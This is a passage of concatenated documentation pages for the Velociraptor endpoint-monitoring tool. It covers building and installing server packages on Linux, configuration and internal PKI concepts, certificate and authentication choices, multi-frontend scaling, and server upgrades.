loopback interface, `127.0.0.1`, to minimize the potential attack surface. If
you have configured SSO authentication you may want to expose the GUI port to
the internet. Note that this is highly discouraged if you are using Basic
authentication.

If you need to access the GUI from other network hosts then open the
configuration file in a text editor and change:

```yaml
GUI:
  bind_address: 127.0.0.1
```

to:

```yaml
GUI:
  bind_address: 0.0.0.0
```

(Please note that only the values `127.0.0.1` or `0.0.0.0` are valid for this
setting.)

If you do decide to expose the GUI to public networks then we recommend you also
restrict access to specific IP ranges using the
[GUI.allowed_cidr]({{<  ref "/docs/deployment/security/#restricting-access-to-the-gui-from-ip-blocks" >}})
setting.

### 3. Create the server installation package

The server component will be installed and run as a service on your Linux
machine. In addition to installing the Velociraptor binary and configuration file, the
installation also creates a service account (named `velociraptor`) and
service configuration so that it can run as a service. The installation package
takes care of these setup tasks, and we generate it using a single command.

The Velociraptor binary provides several utility functions on the command line.
One of these is the ability to generate Linux installation packages,
specifically `deb` packages for Debian-based systems and `rpm` packages for
RPM-based systems.

To create the server installation package, run the appropriate command below in
your working directory.

**Debian-based server:**

```sh
./velociraptor debian server --config ./server.config.yaml
```

or

**RPM-based server:**

```sh
./velociraptor rpm server --config ./server.config.yaml
```

The output file will be automatically named to include the version and
architecture, but you can choose any file name you want and specify it with the
`--output <your_file_name>` flag.

If you did not perform the previous steps on your server then you will need to
copy the server installation file to your server. For example, you could push
the debian package to the server using Secure Copy Protocol (SCP):

```shell
scp velociraptor_server.deb user@123.45.67.89:/tmp/
```

{{% notice warning "Make sure the server installation package file is well protected!" %}}

The server installation package that we created also contains a copy of the
server config, so you should handle it with the same security considerations as
the config file itself.

A compromise of the file will allow access to private key material enabling a
MITM attacks against Velociraptor.

{{% /notice %}}

## Install the server component

Install the server package using the command below according to your server's
packaging system.

**Debian-based server installation:**

```
$ sudo dpkg -i velociraptor_server_0.74.2_amd64.deb
Selecting previously unselected package velociraptor-server.
(Reading database ... 527396 files and directories currently installed.)
Preparing to unpack velociraptor_server_0.74.2_amd64.deb ...
Unpacking velociraptor-server (0.74.2) ...
Setting up velociraptor-server (0.74.2) ...
Created symlink /etc/systemd/system/multi-user.target.wants/velociraptor_server.service → /etc/systemd/system/velociraptor_server.service.
```

or

**RPM-based server installation:**

```
$ sudo rpm -Uvh velociraptor-server-0.74.2.x86_64.rpm
Verifying...                          ################################# [100%]
Preparing...                          ################################# [100%]
Updating / installing...
   1:velociraptor-server-0:0.74.2-A   ################################# [100%]
Created symlink '/etc/systemd/system/multi-user.target.wants/velociraptor_server.service' → '/etc/systemd/system/velociraptor_server.service'.
```

Now that the service is installed we can check its status in a few ways.

**Check the service status:**

```
$ systemctl status velociraptor_server.service
● velociraptor_server.service - Velociraptor server
     Loaded: loaded (/etc/systemd/system/velociraptor_server.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2025-04-08 12:25:34 SAST; 3min 5s ago
   Main PID: 3514 (velociraptor.bi)
      Tasks: 19 (limit: 4537)
     Memory: 67.2M
        CPU: 4.249s
     CGroup: /system.slice/velociraptor_server.service
             ├─3514 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend
             └─3522 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend

Apr 08 12:25:34 linux64-client systemd[1]: Started Velociraptor server.
```

**Check that the Frontend and GUI are listening:**

```sh
$ nc -vz 127.0.0.1 443
Connection to 127.0.0.1 443 port [tcp/*] succeeded!
```

**Check that the connection is secured by Let's Encrypt SSL:**

```sh
$ openssl s_client -connect 127.0.0.1:443 -showcerts
```


## Log in to the Admin GUI

The Admin GUI should now be accessible with a web browser by connecting to
`https://<your_server_name>`.

Log in using either an admin account that you created in the config wizard (if
not using SSO), or one of the authorized accounts you created during the SSO
setup procedure. For SSO you will first be directed to the SSO provider's login
page and then, once authenticated, you will be redirected back to the
Velociraptor application.

You will then arrive at the Welcome screen.

![Welcome to Velociraptor!](welcome.png)

You can learn more about the Admin GUI [here]({{< ref "/docs/gui/" >}}).


## What's next?

After installing your first client, here are the next steps you may want to
consider:

- [Learn about managing clients]({{< ref "/docs/clients/" >}})
- [Create client installers]({{< ref "/docs/deployment/clients/" >}})
- [Explore additional security configuration options]({{< ref "/docs/deployment/security/" >}})
- [Consider creating Orgs]({{< ref "/docs/deployment/orgs/" >}}) for managing
  distinct sets of clients.

---END OF FILE---

======
FILE: /content/docs/deployment/server/key_concepts/_index.md
======
---
menutitle: Key Concepts
title: Key Concepts
draft: false
weight: 10
date: 2025-02-27
last reviewed: 2025-04-27
summary: |
  Before we dive in to server deployment specifics it will be helpful to
  familiarize yourself with a few important concepts, which are central to all
  Velociraptor deployments.
---

Before we dive in to server deployment specifics it will be helpful to
familiarize yourself with a few important concepts, which are central to all Velociraptor
deployments.

* [Velociraptor's Configuration File](#velociraptors-configuration-file)
* [Velociraptor Binaries](#velociraptor-binaries)
* [Velociraptor’s Internal PKI](#velociraptors-internal-pki)
* [Certificate Schemes](#certificate-schemes)
* [Authentication Providers](#authentication-providers)
* [Velociraptor’s ACL model](#velociraptors-acl-model)


## Velociraptor's Configuration File

Central to every Velociraptor deployment is a
[YAML](https://www.tutorialspoint.com/yaml/yaml_basics.htm)
[configuration file]({{< ref "/docs/deployment/references/" >}}).
This file contains all the configuration parameters that define how your server
and clients operate, plus cryptographic material that is used to secure
several aspects of the deployment, such a client-server communications.

Velociraptor includes a command line
[configuration wizard](https://github.com/Velocidex/velociraptor/blob/master/tools/survey/README.md)
which guides you through the key decisions and provides sensible defaults for
most options. Ultimately it produces a YAML configuration file that contains
settings which both the Velociraptor server and clients will use. The
configuration wizard (`config generate -i`) is the recommended way to generate a
_new_ configuration, although it is common to then manually tweak some settings
in the configuration file before deployment. It is also sometimes necessary to
do this in response to new features or issues encountered after deployment.

![Generating a configuration for a self-signed deployment](self-signed-generation.gif)

Running the `config generate` command _without_ the interactive flag will
generate a basic sensible configuration using the self-signed SSL option and
Basic authentication, similar to the deployment described in our
[Quickstart Guide]({{< ref "/docs/deployment/quickstart/" >}}).
You can then manually customize the configuration settings in the YAML file to
your needs. Alternatively you can use this command to create an initial config
and also use the JSON merge flag (`--merge`) to apply customization. This allows
you to automate the generation and customization of the configuration in a
single step, which you may want to do in automated build environments.


{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor config generate --merge \
      '{"autocert_domain": "domain.com", "autocert_cert_cache": "/foo/bar"}' \
      > server.config.yaml
```
_Example: Config generate with merge_
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe config generate ^
      --merge "{"""autocert_domain""": """domain.com""", """autocert_cert_cache""": """/foo/bar"""}" ^
      > server.config.yaml
```
_Example: Config generate with merge_
Note that while this can be run on Windows the quote escaping is arduous and
likely to be error-prone. We therefore don't recommend it.
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor config generate --merge \
      '{"autocert_domain": "domain.com", "autocert_cert_cache": "/foo/bar"}' \
      > server.config.yaml
```
_Example: Config generate with merge_
{{% /tab %}}
{{< /tabs >}}

Because the configuration file is a key component to your deployment and
contains security-sensitive material you should always keep it secure and
ideally also keep an backup of it in a secure location. The server configuration
does not change unless you edit it, so remember to update your backup copy
whenever you make any changes.

The configuration file contains sensible default values for most settings, and
for non-critical keys Velociraptor will default to these values if such keys
are not specified. Editing the file manually to customize and tweak it for your
local deployment is normal and expected.

The config file is divided into sections. Here is a quick overview:

- `version` records details of the Velociraptor version that was used to
  create the configuration file. This is purely informational and does not
  affect operations at all. It is common to have version information here which
  is older than the binary (if the server has been upgraded). When reading a
  slightly old version of the config file, the server will validate and upgrade
  the in-memory copy if any adjustments are needed.
- `Client` section is used to configure clients, and is extracted to produce the
  client configuration file. The server does use some values from this section
  too though.
- `API` configures the API service. The API server accepts connections
  from the GUI gRPC gateway, as well as connections from the gRPC API clients.
- `GUI` configures the admin GUI web application.
- `CA` is the internal Velociraptor CA configuration. Do not edit this section!
  It is only used internally and is needed to sign new API keys and reissue
  server certificates. Secure deployments can remove this part of the config and
  safely store it offline.
- `Frontend` configures the server component that talks with clients. It is intended to
  be exposed to the internet on a public interface so that clients may reach it.
  This section also contains the server's certificate as signed by the CA
- `Datastore` configures the data store implementation, and specifies where to
  store the data for the server. Velociraptor has a datastore abstraction which
  can use a number of data storage engines.
- `Logging` configures logging in text format and optionally syslog. This
  section can apply to server or clients although it is typically not used for
  clients as there are more secure logging options that can be used.
- `Monitoring` controls the built-in monitoring server (i.e. Prometheus) If you
  have a monitoring solution like Grafana or Data Dog then change this server to
  bind to 0.0.0.0 and point your scraper at it.
- `defaults` section is used to define and override various default server
  settings.

You can see a comprehensive listing of settings in our
[configuration reference]({{< ref "/docs/deployment/references/" >}}).

All Velociraptor clients need a client configuration (file), which is specific
to the deployment. This configuration is a subset of the full configuration.

![Client config is a subset of the full config](client_config_yaml.svg)

Because the server has access to the full configuration it is able to provide
the client configuration to us when needed
[in the form of a YAML file]({{< ref "/docs/deployment/clients/#option-1-obtaining-the-client-config-from-the-gui" >}}).
The server can also use it internally, for example when generating a client
installation package.

## Velociraptor Binaries

Velociraptor does not have separate client binaries and server binaries. The
binary can function in either role, and perform various other utility functions.
The command line parameters supplied to the binary tell it whether to behave as
a server or as a client.

This means that it's technically possible to run the server or the client on any
platform that we have a binary for. However
_please note that the server is only fully supported on Linux_,
mainly due to performance considerations inherent in other platforms such as
Windows. For non-production deployments (e.g. development or testing) it might
be convenient for you to run the server on another platform and that's fine if
you feel adventurous and confident in your troubleshooting skills. Just keep in
mind that for production deployments we strongly recommend that the server
should run on Linux and that issues encountered when running the server on other
platforms will not be supported. For this reason we only describe deploying the
server on Linux.

Binaries for the latest version are listed on our
[Downloads]({{< ref "/downloads/" >}}) page, with the binaries themselves being
hosted on Github.

We provide binaries for the most common client platform and architecture
combinations, but if you have a need for an unusual platform/architecture it is
possible to build one for almost any combination supported by Go. Instructions
for building from source are provided on our
[GitHub page](https://github.com/Velocidex/velociraptor/?tab=readme-ov-file#building-from-source).

The binaries used for clients and for the server should ideally be kept at the
same minor version, although there shouldn't be any issues if the client is one
or two releases behind (since we rely on this compatibility to support remote
upgrades).

## Velociraptor’s Internal PKI

Every Velociraptor deployments creates an internal PKI which underpins it. The
configuration wizard creates an internal CA with an X509 certificate and a
private key. This CA is used for:

1. Creating [initial server certificates]({{% ref "/docs/deployment/references/#Frontend.certificate" %}})
   and for reissuing certificates when they expire.

2. Verifying the server during client-server communications. [The CA public
   certificate]({{% ref "/docs/deployment/references/#Client.ca_certificate" %}})
   is embedded in the client’s configuration and is used to verify
   (and therefore trust) the server.

3. Creating API keys for programmatic access. The server is then able to verify
   API clients.

4. Creating client certificates for (optional) mTLS. This allows clients to be
   authenticated using certificates.


The configuration file contains the CA’s X509 certificate in the
`Client.ca_certificate` key (and is therefore included in the client
configuration). The private key is contained in the `CA.private_key` parameter.
Since the client’s configuration contains the (trusted) CA's certificate, it is
able to verify the server's certificate during communications.

The internal CA will be used to verify the different Velociraptor components in
all cases, regardless of whether other TLS certificates are used. While it is
possible to reissue/rotate server certificates the CA certificate can not be
reissued without re-deploying all the clients.

{{% notice warning "Protecting the CA private key" %}}

In a secure installation you should remove the `CA.private_key` section from
the server config and keep it offline. You only need it to
[create new API keys]({{< ref "/docs/server_automation/server_api/#creating-an-api-client-configuration" >}})
and when
[rotating server certificates]({{< ref "/knowledge_base/tips/rolling_certificates/" >}})
(typically after 1 year).
The server does not need it during normal operations.

{{% /notice %}}


## Certificate Schemes

In addition to using certificates issued by the internal CA, Velociraptor
supports TLS for client-server communications as well as access to the GUI. This
_outer_ TLS-secured layer allows the use of certificates issued by other CAs,
although we also can use our own self-signed certificates for this purpose.

Before the client communicates with the server, the client must verify it is
actually talking with the correct server. This happens at two levels:

1. If the server URI is an HTTPS URI then the TLS connection needs to be
   verified. This means that the certificate needs to be signed by a trusted CA.
2. The client will then fetch the certificate from the URI `/server.pem` which
   is the server's internal certificate. This certificate must be verified
   against the embedded CA certificate.

This verification is essential in order to prevent the client from accidentally
talking with captive portals or MITM proxies.

By default Velociraptor searches for root certificates from the running system
so it can verify TLS connections. Additionally Velociraptor accepts additional
root certs embedded in its config file (Just add all the certs in PEM format
under the `Client.Crypto.root_certs` key in the config file). This helps
deployments that must use a MITM proxy or traffic inspection proxies.

For the outer TLS, Velociraptor supports self-signed and certs issued by trusted
CAs.

#### Self-signed Certificates

In self-signed SSL mode, Velociraptor issues its own server certificate using
its internal CA. This means the Admin GUI and front end also use a self-signed
server certificate.

This type of deployment is most appropriate for on-premises scenarios where
internet access is not available or egress is blocked.

Self-signed SSL certificates trigger SSL warnings in all web browsers. When
accessing the Admin GUI you will receive a certificate warning about the
possibility of a MITM attack.

Velociraptor doesn't support other self-signed SSL certificates, and we don't
recommend attempting to add your own self-signed certificates to Velociraptor.

#### CA-issued Certificates

For CA-issued certificates we prefer Let's Encrypt since these are free and
Velociraptor has the built-in capability to request and rotate certificates from
Let's Encrypt. Other CAs are also supported, including private CAs, although
this requires
[manual configuration and certificate management]({{< ref "/knowledge_base/tips/ssl/" >}}).

##### A. Let's Encrypt

To use Let's Encrypt certificates we have an internal mechanism for requesting a
certificate for the DNS name provided in Velociraptor's config. In order to this
to work, Let's Encrypt goes through a verification protocol requiring that one
of their servers connect to the Velociraptor server on ports 80 and 443.

Therefore, the server needs to be reachable over ports 80 and 443 (You can not
serve over a non-standard SSL port with Let's Encrypt).

If you filter port 80 from the internet then Let's Encrypt will be unable to
verify the domain and will likely blacklist the domain name for a period. It is
crucial that port 80 and 443 be unfiltered to the world. It is difficult to
recover from a blacklisting event other than waiting for a long period of time.

##### B. Bring your own certs

It is possible to use a certificate from a public CA or your own private CA, but
this requires manual configuration and certificate management.

Please see
[Securing Network Communications]({{< ref "/docs/deployment/security/#securing-network-communications" >}})
for a more detailed discussion of this option.


## Authentication Providers

Velociraptor offers a number of options to authenticate users into the GUI. The
type of authenticator is specified in the `GUI.authenticator.type` setting. The
config wizard supports configuring some commonly-used authenticators, but others
have to be manually configured.

To make deployment easier the configuration wizard supports creating
**Initial Users**. These user accounts will be created automatically when the
server starts upon first installation and be given the administrator role.
This provides a way to bootstrap the administrator into the server. If the Basic
authentication method is specified, the password hashes and salt will be
initialized from the configuration file. For other authentication methods that
do not use passwords, the password hashes are ignored.

Velociraptor supports a number of choices for authentication providers:

1. Basic Authentication - this stores usernames and passwords in Velociraptor's
   own datastore.
2. OAuth2 - providers such as Google, Azure or GitHub support SSO via OAuth2.
3. OIDC - uses the Open ID Connect protocol to support many IAM providers (e.g.
   Okta)
4. SAML - Security Assertion Markup Language, also supported by many public SSO
   providers.
5. [Multi]({{< ref "/knowledge_base/tips/multiple_oauth/" >}}) - a combination
   of the abovementioned auth methods.

## Velociraptor’s ACL model

Velociraptor is a very powerful tool with a great deal of privileged access to
many endpoints. By necessity, Velociraptor clients typically run with System or
root level access on endpoints in order to have low level access to the
operating system. It follows that administrators on Velociraptor also have
privileged access to the entire domain as well — they are equivalent to domain
administrators.

Velociraptor users are assigned various permissions to control their actions. To
make it easier to deal with a group of permissions, Velociraptor has the concept
of a **role** which can be thought of as just a predefined set of
**permissions**. The actual permission check is made against the set of
permissions the user has.

Please see
[Velociraptor’s ACL model]({{< ref "/blog/2020/2020-03-29-velociraptors-acl-model-7f497575daee/" >}})
and [Roles and permissions]({{< ref "/docs/deployment/security/#roles-and-permissions" >}})
for a more detailed discussion of this topic.

---END OF FILE---

======
FILE: /content/docs/deployment/server/key_decisions/_index.md
======
---
menutitle: Key Decisions
title: Key Deployment Decisions
draft: false
weight: 20
date: 2025-04-27
last reviewed: 2025-04-27
summary: "Guidance on selecting the right options for your deployment."
---

With a wide array of deployment options available, it is sometimes difficult to
decide which are the best choices for your deployment.

Velociraptor aims to be as flexible as possible, but many users come from an
environment full of products where a vendor prescribes how their product should
be deployed and used. Unfortunately some people like to be told "the right way"
to implement a solution. However Velociraptor is designed to support difficult
environments (which you may encounter in IR situations) and allow for
[creative uses]({{< ref "/docs/deployment/#other-ways-to-use-velociraptor" >}})
so there isn't really one "right" way to use or deploy Velociraptor.

To guide your choices we have an interactive configuration wizard, which is
accessed by running the `velociraptor config generate -i` command. The aim of
the wizard is to make it easy to configure Velociraptor in the most common
deployment scenarios. Even though these scenarios will not be a perfect fit for
everyone, most users should be able to start with these deployment modes and
then tweak the resulting configuration to their specific needs.

The end result of running the configuration wizard is a YAML configuration file.
So there is no harm in doing "dry runs" and examining or comparing resulting
files to better understand how the choices affect the resulting configuration.

The most significant choices to make prior to deployment are:
- [the certificate scheme]({{< ref "/docs/deployment/server/key_concepts/#certificate-schemes" >}})
- [the authentication scheme]({{< ref "/docs/deployment/server/key_concepts/#authentication-providers" >}})

As shown in the diagram below, the most common choices for the certificate
scheme is either Self-signed SSL or Let's Encrypt SSL, which are the choices
offered by the configuration wizard. Using your own certificates is possible but
considered an "advanced" option, since it requires some knowledge of PKI
concepts, working with certificate files, editing configuration, and also
potentially some occasional management in reissuing certificates.

If you do want to use your own certificates then it is recommended to start with
a configuration that uses Self-Signed or Let's Encrypt, and then
[switch to using your own certificates]({{< ref "/knowledge_base/tips/ssl/" >}})
_after_ you are sure that your deployment works as expected (with a few test
clients).

![Decision tree for the main configuration options](decision_tree.svg)

For enterprise deployments or servers that need to be exposed to the internet,
SSO authentication is highly recommended.

If you decide to use Self-signed certificates then the configuration wizard will
only set up the Basic authentication provider, as these options are frequently
used together. You can still manually configure SSO, but if you choose to use
Basic authentication then you should then seriously consider additional measures
to secure the Admin GUI.

In all cases, we recommend that you review all the security options described in
the section
[Velociraptor Security Configuration]({{< ref "/docs/deployment/security/" >}}),
and implement these whenever possible.
---END OF FILE---

======
FILE: /content/docs/deployment/server/multifrontend/_index.md
======
---
menutitle: Multi-Frontend
title: Multi-Frontend Configuration
draft: false
weight: 40
summary: |
  Guidance on scaling your deployment and using Velociraptor's (experimental)
  Multi-Frontend deployment model.
---

{{% notice warning %}}

This configuration is currently considered **experimental!** We have
reports of it working well but there may still be bugs and issues. We
highly recommend that if you intend to run in this mode, please
contact us at support@velocidex.com or on [Discord]({{< ref "/discord/" >}})
and provide feedback or issues.

Being experimental, this feature also falls outside our [support
policy]({{< ref "/docs/overview/support/" >}}) and features may change
at any time.

{{% /notice %}}

This page describes the challenges and concepts around scaling
Velociraptor on multiple servers. By understanding the limitations and
challenges of this architecture, as well as the strategies
Velociraptor uses to scale, readers will gain an understanding of the
various configuration parameters that can be used and what they mean.

## Scaling Velociraptor

Velociraptor is an endpoint visibility tool designed to query a large
number of endpoints quickly and efficiently. In previous releases,
Velociraptor was restricted to a single server performing all
functions, such as serving the GUI, the gRPC API as well as
connections to the clients (endpoint agents). While this architecture
is regularly used to serve up to 10k-15k endpoints, at high number of
endpoints, we are starting to hit limitations with the single server
model.

### What are the bottlenecks of scale?

If you have ever used Velociraptor on a small network of endpoints
(say between 2k-5k endpoints), you would be accustomed to a snappy
GUI, with the ability to query any of the currently connected
endpoints instantly. Velociraptor clients typically do not poll, but
are constantly connected to the server— this means that when tasking a
new collection on an endpoint, we expect it to respond instantly.

As the number of endpoints increase this performance degrades. When
forwarding a large number of events from the end points, or performing
hunts that transfer a lot of data, one might experience sluggish
performance.

## Adding more frontend servers

The natural response to scaling is to increase the number of frontend
server (Velociraptor `frontend servers` are those directly connected
with clients). If we can keep the number of clients connected to each
frontend around the 10k limit, and just increase the total number of
servers, we can in theory at least, scale arbitrarily.

### Storage requirements

Velociraptor collects two distinct classes of data. Internally,
Velociraptor separates access to these two different types depending
on the data latency and bandwidth requirements:

1. **Datastore**: In Velociraptor terminology the data store is used
   to store small metadata about various things, such as clients,
   flows, collections etc. These are usually encoded in the form of
   small JSON files.

2. **Filestore**: The Filestore is used to store large, bulk data,
   such as collected files or the result sets from running queries on
   clients.

The two concepts are separated in Velociraptor because they typically
have much different access patterns:

* Datastore items are read and written frequently - for example,
  client metadata is checked regularly by all servers. Flow
  information is also checked frequently to update its statistics
  etc. Typically datastore items are read and written as single JSON
  units. Datastore items have typically very small bandwidth
  requirements since they are just small JSON encoded, but the data
  needs to be synchronized across all frontends.

* Filestore items are typically written by the server as data is
  collected from clients. They are not read very often - typically
  only by the GUI or server side VQL queries. Filestore items are very
  large (think collected memory images, or event logs) so require
  large bandwidth to the storage medium, but latency requirements are
  not very strict (as long as the data eventually makes it the storage
  this is fine!).

In the single server deployments, we typically use an attached storage
device (usually an SSD storage) to the server and use it to store both
types of data. This works pretty well because SSD storage is very fast
and provides both **high bandwidth** and **very low latency**.

### Scaling storage

In order to scale storage between multiple servers, we need to use a
**distributed filesystem**, such as NFS or EFS. Typically we use AWS
EFS service although other cloud providers offer a similar service
(e.g. Google Filestore)

Network filesystems are typically mounted on the instance at a
specific **mount point directory**, and appear just like a normal
attached storage, so they can be directly used by Velociraptor by
simply pointing the `Datastore.Location` configuration parameter at
this mount point.

However, there are some critical key differences between EFS and
attached storage!

### High latency filesystems

Network filesystems typically exhibit high latency, since each IO
operation involves a network round trip. This inevitably results in
around 40-60ms per read/write operation.

This property degrades operation with distributed servers. For
example, consider the Velociraptor frontend receiving a collection
response from the client:

1. Read the client's public key so we can decrypt the messages.
2. Read the flow from disk so we know where to store the data
3. Write the result set to storage
4. Write the updated flow information to storage.

Filesystem latency will add some time to each of these steps,
resulting in a much longer time to serve each client request -
therefore limiting the total number of client requests we can serve in
a given time.

Synchronization across multiple frontends might also be a
problem. Imagine a hunt being run across the deployment. The hunt
statistics record contains information such as total clients
scheduled, total client complete etc. If the record is being
concurrently updated from multiple servers, the record needs to be
locked and filesystem locks are extremely slow in NFS so they must be
avoided at all cost.

## Velociraptor's multi server design

Currently Velociraptor's multi server design is divided into a
**master** server and one or more **minion** servers. The servers
coordinate work by passing messages using a **replication service**
between minion and master.

![Multi Frontend architecture overview](MultiFrontend_design.png)

### The Master node

The master node runs specific services that coordinate clients. Some
of these service are:

1. The GUI service only runs on the master node.
2. The `Hunt Manager` service is responsible for scheduling
   collections on clients, keeping track of hunt statistics and
   creating new hunts.

3. Datastore - the Master is the only node that reads/writes to the
   data store (note - the datastore only stores very small metadata
   files). On the master, the datastore is typically cached in memory
   and synchronized to the EFS volume asynchronously.

4. Replication service - relays messages from all minions to various
   listeners. This is the main mechanism the master uses for
   communication with the minions.

### The Minion node

The minion node is responsible for collecting data from clients:

1. The minion does not read or write directly from the datastore,
   instead it uses a remote procedure call (gRPC) to read from the
   master's datastore. This means that the master is the source of
   truth for metadata and there is no need to implement additional
   cluster wide locking.

2. The minion write bulk data directly to the EFS volume. These write
   occur asynchronously Since bulk data is the majority of file IO,
   minions are offloading a significant proportion of file IO.

3. Minions are responsible for dispatching work to clients, and
   collecting their responses.

## Strategies to address high latency

Here we describe some of the strategies used to increase performance.

### Caching

To work around a lot of the latency issues, Velociraptor implements
multiple caching mechanisms to ensure file IO is not needed. The
caching allows writes to occur in parallel at a later stage without
holding the client's connection open for too long.

* Client key cache - This is required to decrypt messages from
  clients. Velociraptor keeps keys in memory to avoid having to read
  those from storage for each incoming connection. The size of the
  cache is controlled by the `Frontend.resources.expected_clients`
  setting.

* Search index cache: The client search index is used by the GUI to
  search for clients by labels, hostname, IP address etc. From 0.6.3
  the search index is completely memory resident, making search
  queries very fast.

* Datastore memory cache - The Master node, caches datastore files in
  memory. Much of the time, writes to the datastore are completed
  immediately into the memory cache, while the cache is flushed to the
  EFS storage asynchronously. This removes the perception of latency
  from most datastore operations.

## Configuration

This section describes how to configure a multi server deployment. We
typically start off with a normal configuration as generated with
`velociraptor config generate -i`.

![Generating a basic configuration](basic_generation.png)

In the above example we generated a self signed configuration with a
server at `master.velocidex-training.com`. We will use the dynamic DNS
setting to automatically update the frontend DNS mapping.

Now we derive a multi-server configuration from this basic configuration.

```bash
velociraptor --config server.config.yaml config frontend
```

![Generating a multi frontend configuration](config_frontend.png)

Let's look at some of the generated configuration. The client
configuration is now changed to include both minion and master:

```yaml
Client:
  server_urls:
    - https://master.velocidex-training.com:8000/
    - https://minion.velocidex-training.com:8100/
```

This will cause clients to randomly select which server to connect to.

The API server is now listening on all interfaces and can be accessed
by the public hostname. This is required for minions to connect to the
master.

```yaml
API:
  hostname: master.velocidex-training.com
  bind_address: 0.0.0.0
  bind_port: 8001
```

There is an additional configuration part for each minion:

```yaml
ExtraFrontends:
- hostname: minion.velocidex-training.com
  bind_address: 0.0.0.0
  bind_port: 8100
  dyn_dns:
      ddns_username: ZWLfJ7InGAB1PcoC
      ddns_password: ufNrxN95HKhRjutM
```

Finally note the datastore configuration

```yaml
Datastore:
  location: /opt/velociraptor
  filestore_directory: /opt/velociraptor
  minion_implementation: RemoteFileDataStore
  master_implementation: MemcacheFileDataStore
```

We can see that the master will be running the
`MemcacheFileDataStore` - a specific implementation of the data store
which stores file in a memory cache while syncing them with the
storage asynchronously.

The minion, on the other hand will connect to the master via the
remote datastore (a gRPC based datastore implementation).

## Creating the server installation package.

The normal deb packaging command will create two packages when given a
multi-frontend configuration:

```yaml
$ ./velociraptor --config server.config.yaml debian server
$ ls -l *.deb
-rw-rw-r-- 1 me me 27429604 Mar 28 16:32 velociraptor_server__master_master.velocidex-training.com-8000_0.74.1_amd64.deb
-rw-rw-r-- 1 me me 27429604 Mar 28 16:32 velociraptor_server__minion_minion.velocidex-training.com-8100_0.74.1_amd64.deb
```

Each of these packages should be deployed on their own virtual
machine instances.  Each VM should be built with the same EFS volume
mounted on `/opt/velociraptor`.

---END OF FILE---

======
FILE: /content/docs/deployment/server/upgrades/_index.md
======
---
menutitle: Upgrades
title: Server Upgrades
draft: false
weight: 50
date: 2025-02-27
last reviewed: 2025-04-27
summary: "How to upgrade your server."
---

Upgrading the server component is usually a simple matter of creating a new
server installation package using the latest version and your existing
configuration file, and then applying it to your server.

{{% notice note "Backing up your configuration file" %}}

The configuration file contains cryptographic keys that allow clients
and server to communicate. Each time the configuration is regenerated
(e.g. using `velociraptor config generate`), new keys are created.

It is imperative to backup the configuration file somewhere safe
(perhaps offline) and re-use the same file when upgrading to a new
version of Velociraptor in order to preserve the key material and
maintain client communication.

Remember to always make a backup copy of your config file before upgrading and
after upgrading, just in case changes are made by the upgrade!

{{% /notice %}}

From time to time, the schema of the configuration file may evolve with newer
versions. When a newer version of Velociraptor encounters an older configuration
file, it attempts to upgrade the configuration file to the latest version. This
happens automatically and is usually a seamless process.

During the installation package preparation the upgraded config file is embedded
into the server package so you will receive an upgraded configuration file
installed to the `/etc/` directory. You can see the version that wrote the
configuration file in the `version` section of the configuration file.

## Upgrading a server (in-place upgrade)

To upgrade the Velociraptor server to a new version, first download the
[latest release binary]({{< ref "/downloads/" >}}),
appropriate for your server's architecture.

### Create a new server installation package

On your server, create a new server installation package using the new binary
(which we've renamed 'velociraptor' in the commands below) and your existing
config file (which will be `/etc/velociraptor/server.config.yaml` on an existing
server):

**Debian-based server:**

```sh
./velociraptor debian server --config /etc/velociraptor/server.config.yaml
```

or

**RPM-based server:**

```sh
./velociraptor rpm server --config /etc/velociraptor/server.config.yaml
```

The output file will be automatically named to reflect the version and
architecture of the new Velociraptor version, but you can choose any file name
you want and specify it with the `--output <your_file_name>` flag.

### Run the upgrade

Then upgrade by installing the new server package using the relevant command
below, according to your server's packaging system.

**Debian-based server installation:**

```
$ sudo dpkg -i velociraptor_server_0.74.2_amd64.deb
Selecting previously unselected package velociraptor-server.
(Reading database ... 527396 files and directories currently installed.)
Preparing to unpack velociraptor_server_0.74.2_amd64.deb ...
Unpacking velociraptor-server (0.74.2) ...
Setting up velociraptor-server (0.74.2) ...
Created symlink /etc/systemd/system/multi-user.target.wants/velociraptor_server.service → /etc/systemd/system/velociraptor_server.service.
```

or

**RPM-based server installation:**

```
$ sudo rpm -Uvh velociraptor-server-0.74.2.x86_64.rpm
Verifying...                          ################################# [100%]
Preparing...                          ################################# [100%]
Updating / installing...
   1:velociraptor-server-0:0.74.2-A   ################################# [100%]
Created symlink '/etc/systemd/system/multi-user.target.wants/velociraptor_server.service' → '/etc/systemd/system/velociraptor_server.service'.
```

The upgrade should proceed smoothly. After upgrading you can check that the
service is running:

```
$ systemctl status velociraptor_server.service
● velociraptor_server.service - Velociraptor server
     Loaded: loaded (/etc/systemd/system/velociraptor_server.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2025-04-08 12:25:34 SAST; 3min 5s ago
   Main PID: 3514 (velociraptor.bi)
      Tasks: 19 (limit: 4537)
     Memory: 67.2M
        CPU: 4.249s
     CGroup: /system.slice/velociraptor_server.service
             ├─3514 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend
             └─3522 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend

Apr 08 12:25:34 linux64-client systemd[1]: Started Velociraptor server.
```

## Reverting versions

It is generally ok to revert from later versions to earlier versions since the
migration process is generally non destructive.

The process is identical to the one for in-place upgrades described above,
except that you would create the installer package using the earlier version of
the Velociraptor binary.

## Migrating clients to a new server

If you wanted to completely change the way the server is configured by
regenerating the config file (for example, if you need to switch from self-
signed to Let's Encrypt certificates) you may need to stand up a completely new
server (with a different DNS name, certificates, keys etc) and migrate existing
clients to it.

This method allows the orderly migration of Velociraptor clients from
an old server to a new server by using a remote client upgrade.

You can use the old server to push the new MSI to existing clients, but as the
new MSI is installed the new client config file overwrites the old one and the
new velociraptor client will then connect to the new server and enroll as a new
client (with a new client ID).




---END OF FILE---

======
FILE: /content/docs/deployment/security/_index.md
======
---
menutitle: Security
title: Velociraptor Security Configuration
weight: 46
summary: |
  Velociraptor is a highly privileged service with elevated access to thousands
  of endpoints across the enterprise. It is therefore crucial to secure the
  deployment as much as possible.
---

Velociraptor is a highly privileged service with elevated access to
thousands of endpoints across the enterprise. It is therefore crucial
